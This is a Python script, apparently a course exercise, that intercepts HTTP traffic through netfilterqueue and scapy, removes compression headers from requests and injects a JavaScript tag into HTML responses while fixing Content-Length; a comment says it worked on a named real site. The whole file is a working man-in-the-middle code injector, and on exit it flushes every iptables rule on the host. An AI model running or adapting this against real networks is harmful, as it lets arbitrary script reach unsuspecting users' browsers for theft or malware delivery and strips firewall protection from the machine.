#!/usr/bin/env python

# iptables -I FORWARD -j NFQUEUE --queue-num 0
# to delete the iptables rule... iptables --flush
# Accept-Encoding:.*?\\r\\n    --> .*->any character any no of times, ?->non greedy, stop at first \r\n, \\r->\r, \\n->\n  pythex website

import netfilterqueue
import subprocess
import scapy.all as scapy
import optparse
import re

# def get_arguement():
#     parser = optparse.OptionParser()
#     parser.add_option("-t","--target",dest="target",help="Target website")
#     (options,args) = parser.parse_args()
#     return options

subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"]) # FORWARD chain for packets going through the box, INPUT for packets coming into the box, OUTPUT for packets going out of the box.
subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"]) # FORWARD chain for packets going through the box, INPUT for packets coming into the box, OUTPUT for packets going out of the box.

def set_load(packet,load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    # option = get_arguement()
    # target = option.target
    scapy_packet = scapy.IP(packet.get_payload()) # convert the packet to a scapy packet
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("\n\n[+] REQUEST\n\n")
            load = re.sub("Accept-Encoding:.*?\\r\\n","",load) #from pythex

        elif scapy_packet[scapy.TCP].sport == 80:
            print("\n\n[+] RESPONSE\n\n")
            injection_code = "<script>alert(1)</script>"
            #load = load.replace("</h1>","</h1><script>alert(1)</script>")
            load = load.replace("</body>",injection_code + "</body>")
            #load = load.replace("</script>","alert(1)</script>") # works on http://diptera.myspecies.info/
            content_length_search = re.search("(?:Content-Length:\s)(\d*)",load) # Split into 2 groups. ?: indicates that this group is not included in the regular expression, use it only to locate the string.
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1) # First string matched out of the whole string
                new_content_length = int(content_length) + len(injection_code) # addition to find new content length
                load = load.replace(content_length,str(new_content_length))
                #print(content_length)
            #print(scapy_packet.show())

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept() # forward the packet to target or packet.drop() to drop the packet

# option = get_arguement()
# target = option.target
# if not target:
#     print("Enter target using -t.\n-h for help menu")
#     exit()
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet) #Every packet from queue number 0 will go to process_packet function
    queue.run()
except KeyboardInterrupt:
    subprocess.call(["iptables", "--flush"])
    print("\niptables rules are deleted")